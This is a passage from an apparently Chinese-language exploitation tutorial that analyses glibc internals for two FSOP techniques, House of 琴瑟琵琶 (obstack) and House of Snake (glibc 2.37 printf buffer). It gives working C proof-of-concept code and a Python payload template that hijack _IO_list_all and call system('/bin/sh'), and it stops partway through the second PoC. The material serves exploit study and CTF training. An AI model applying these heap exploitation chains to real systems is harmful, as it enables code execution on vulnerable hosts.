<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        obstack_grow(obstack, data, n);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line"> 替换:  </span><br><span class="line">        (&#123;</span><br><span class="line">            <span class="keyword">struct</span> obstack *__o = (obstack);</span><br><span class="line">            <span class="type">int</span> __len = (n);</span><br><span class="line">            <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, __len);</span><br><span class="line">            <span class="built_in">memcpy</span>(__o-&gt;next_free, data, __len);</span><br><span class="line">            __o-&gt;next_free += __len;</span><br><span class="line">            (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></div>
<p>之后触发<code>CALL_CHUNKFUN</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _obstack_newchunk(<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">    <span class="type">long</span> new_size;</span><br><span class="line">    <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> already;</span><br><span class="line">    <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">    new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">        new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">    new_chunk = CALL_CHUNKFUN(h, new_size); <span class="comment">// 调用函数位置</span></span><br><span class="line">    ...</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
<p><code>CALL_CHUNKFUN</code>宏实际上是使用了结构体中的指针<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，并且第一个参数可控，同时需要保证<code>(((h)-&gt;use_extra_arg)</code>为1</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">new_chunk = CALL_CHUNKFUN(h, new_size);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_CHUNKFUN(h, size)                          \</span></span><br><span class="line"><span class="meta">    (((h)-&gt;use_extra_arg)                               \</span></span><br><span class="line"><span class="meta">             ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) \</span></span><br><span class="line"><span class="meta">             : (*(struct _obstack_chunk * (*) (long) )(h)-&gt;chunkfun)((size)))</span></span><br><span class="line">替换:  </span><br><span class="line">(((h)-&gt;use_extra_arg) ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (new_size)) : (*(<span class="keyword">struct</span> _obstack_chunk *(*) (<span class="type">long</span>) )(h)-&gt;chunkfun)((new_size)))</span><br></pre></td></tr></table></figure></div>
<p>因此可以按下图所示方法构造： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f2d3f8634e9f15a5b53e2cea36f32bc8.png"
                     
alt="在这里插入图片描述" 
                > <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_qspp" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_IO_obstack_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = fake_IO_obstack_file + <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_obstack_jumps = libc_base + <span class="number">0x1ce420</span>;</span><br><span class="line"></span><br><span class="line">    fake_IO_obstack_file[<span class="number">4</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">5</span>] = <span class="number">1</span>;                       <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">27</span>] = IO_obstack_jumps + <span class="number">0x20</span>;<span class="comment">// vtable</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_obstack;  <span class="comment">//obstack</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;fake_IO_obstack_file[<span class="number">29</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;                   <span class="comment">//chunkfun -&gt; system</span></span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) &amp;fake_IO_obstack_file[<span class="number">29</span>];<span class="comment">//extra_arg -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">    fake_obstack[<span class="number">10</span>] |= <span class="number">1</span>;                               <span class="comment">//use_extra_arg = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>攻击模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">obstack_ptr = fake_io_addr + <span class="number">0x30</span></span><br><span class="line">fake_io_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(system_addr)  <span class="comment"># 需要执行的函数</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(fake_io_addr+<span class="number">0xe8</span>)  <span class="comment"># 执行函数的 rdi</span></span><br><span class="line">fake_io_file += p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;use_extra_arg=1</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>)  <span class="comment"># _IO_lock_t *_lock;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_obstack_jumps_addr + <span class="number">0x20</span>)  <span class="comment"># 触发 _IO_obstack_xsputn;</span></span><br><span class="line">fake_io_file += p64(obstack_ptr)  <span class="comment"># struct obstack *obstack</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_io_file))) <span class="comment"># 因为是largebin attack 所以: 0xd8=0xe8-0x10</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行函数的 rdi 的地址所存储的内容</span></span><br><span class="line">payload = fake_io_file+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="house-of-snake">House of Snake</h2>
<p>glibc-2.37 删除了 <code>_IO_obstack_jumps</code> 但是添加了
<code>_IO_printf_buffer_as_file_jumps</code> 这个新的
<code>_IO_jumps_t</code> 结构体。
<code>_IO_printf_buffer_as_file_jumps</code> 中只有
<code>__printf_buffer_as_file_overflow</code> 和
<code>__printf_buffer_as_file_xsputn</code> 两个函数，而 House of Snake
利用的是 <code>__printf_buffer_as_file_overflow</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>__printf_buffer_as_file_overflow</code> 函数定义如下：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> __attribute_warn_unused_result__</span><br><span class="line">__printf_buffer_has_failed(<span class="keyword">struct</span> __printf_buffer *buf) &#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;mode == __printf_buffer_mode_failed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow(FILE *fp, <span class="type">int</span> ch) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">    __printf_buffer_as_file_commit(file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">    <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">        __printf_buffer_putc(file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!__printf_buffer_has_failed(file-&gt;next)</span><br><span class="line">        &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">        __printf_buffer_flush(file-&gt;next);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 首先 <code>__printf_buffer_as_file_overflow</code>
函数将 <code>FILE</code> 结构体转换为
<code>__printf_buffer_as_file</code> 类型，相关定义如下：
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 之后调用了 <code>__printf_buffer_as_file_commit</code>
，该函数做了一些检查： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后根据参数 <code>ch</code>
是否为 <code>EOF</code> 决定是否调用 <code>__printf_buffer_putc</code>
。FSOP 中调用的 <code>_IO_flush_all_lockp</code> 函数中是通过
<code>_IO_OVERFLOW (fp, EOF)</code> 调用到 <code>vtable</code> 中的
<code>overflow</code> 函数，因此
<code>__printf_buffer_as_file_overflow</code> 的参数 <code>ch</code> 为
<code>EOF</code> 。 当然，即使调用到了 <code>__printf_buffer_putc</code>
也只是是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p>
<p>再之后会调用 <code>__printf_buffer_flush</code> 函数，调用条件是
<code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 且
<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>
。</p>
<p><code>__printf_buffer_flush</code> 函数定义如下，这里再次检查
<code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 然后调用
<code>__printf_buffer_do_flush</code> 函数，参数为
<code>file-&gt;next</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf(n) __printf_##n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer_flush Xprintf (buffer_flush)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer Xprintf (buffer)</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">Xprintf_buffer_flush</span> <span class="params">(<span class="keyword">struct</span> Xprintf_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  Xprintf (buffer_do_flush) (buf); <span class="comment">// __printf_buffer_do_flush(buf)</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果
<code>file-&gt;next.mode = __printf_buffer_mode_obstack(11)</code>
那么会调用 <code>__printf_buffer_flush_obstack</code> 函数。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 这里 <code>__printf_buffer_obstack</code>
结构体定义如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 如果满足
<code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> 则
<code>__printf_buffer_flush_obstack</code> 会执行
<code>obstack_1grow</code> 宏。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>obstack_1grow</code> 宏展开内容如下，可以看到该宏调用了
<code>_obstack_newchunk</code> 函数并将 <code>buf-&gt;obstack</code>
作为参数传入。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">声明位置: obstack.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)                          \</span></span><br><span class="line"><span class="meta">  __extension__                                      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                          \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, 1);                          \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);                          \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line">替换:  </span><br><span class="line">(&#123;</span><br><span class="line">    <span class="keyword">struct</span> obstack *__o = (buf-&gt;obstack);</span><br><span class="line">    <span class="keyword">if</span> (__o-&gt;next_free + <span class="number">1</span> &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, <span class="number">1</span>);</span><br><span class="line">    (*((__o)-&gt;next_free)++ = (buf-&gt;ch));</span><br><span class="line">    (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div> <code>_obstack_newchunk</code> 函数会执行
<code>CALL_CHUNKFUN</code> 宏，这和前面的 House of 琴瑟琵琶利用链相同。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  ...</span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>回顾一下整个分析过程并将所有相关结构体，并都看成
<code>__printf_buffer_as_file</code> 结构体，有以下条件： - 在
<code>__printf_buffer_as_file_overflow</code> 函数中： -
<code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>
- 在 <code>__printf_buffer_as_file_commit</code> 函数中： -
<code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code>
-
<code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code>
-
<code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code>
-
<code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code>
- 在 <code>__printf_buffer_flush</code> 函数中： -
<code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code> - 在
<code>__printf_buffer_flush_obstack</code> 函数中： -
<code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;==&gt;
<code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code>
- 在 <code>obstack_1grow</code> 宏定义中： -
<code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code>
- <code>(h)-&gt;use_extra_arg</code> 不为 0 &lt;==&gt;
<code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></p>
<p>最终调用
<code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunkfun((struct __printf_buffer_obstack *) file-&gt;obstack-&gt;extra_arg)</code>
。</p>
<p>具体构造如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/0c9e82b6d37adf715968b6b9b18c2815.png"
                     
alt="在这里插入图片描述" 
                > <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_snake" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下： <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint-gcc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> &#123;</span></span><br><span class="line">    __printf_buffer_mode_failed,</span><br><span class="line">    __printf_buffer_mode_sprintf,</span><br><span class="line">    __printf_buffer_mode_snprintf,</span><br><span class="line">    __printf_buffer_mode_sprintf_chk,</span><br><span class="line">    __printf_buffer_mode_to_file,</span><br><span class="line">    __printf_buffer_mode_asprintf,</span><br><span class="line">    __printf_buffer_mode_dprintf,</span><br><span class="line">    __printf_buffer_mode_strfmon,</span><br><span class="line">    __printf_buffer_mode_fp,            <span class="comment">/* For __printf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fp_to_wide,    <span class="comment">/* For __wprintf_fp_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_fphex_to_wide, <span class="comment">/* For __wprintf_fphex_l_buffer.  */</span></span><br><span class="line">    __printf_buffer_mode_obstack,       <span class="comment">/* For __printf_buffer_flush_obstack.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *write_base;</span><br><span class="line">    <span class="type">char</span> *write_ptr;</span><br><span class="line">    <span class="type">char</span> *write_end;</span><br><span class="line">    <span class="type">uint64_t</span> written;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leak libc_base.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x74960</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijack _IO_list_all by large bin attack.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2680</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] construct fake file.&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *fake_printf_buffer_as_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span> *<span class="title">fake_printf_buffer_obstack</span> =</span> fake_printf_buffer_as_file + <span class="number">29</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = (<span class="type">size_t</span> *) &amp;fake_printf_buffer_obstack-&gt;obstack;</span><br><span class="line">    <span class="type">char</span> *arg = (<span class="type">char</span> *) &amp;fake_obstack[<span class="number">11</span>];</span><br><span class="line">    <span class="type">size_t</span> IO_printf_buffer_as_file_jumps = libc_base + <span class="number">0x1cdd60</span>;<span class="comment">// _IO_printf_buffer_as_file_jumps</span></span><br><span class="line"></span><br><span class="line">    fake_printf_buffer_as_file[<span class="number">4</span>] = <span class="number">0</span>;                                           <span class="comment">// _IO_write_base</span></span><br><span class="line">    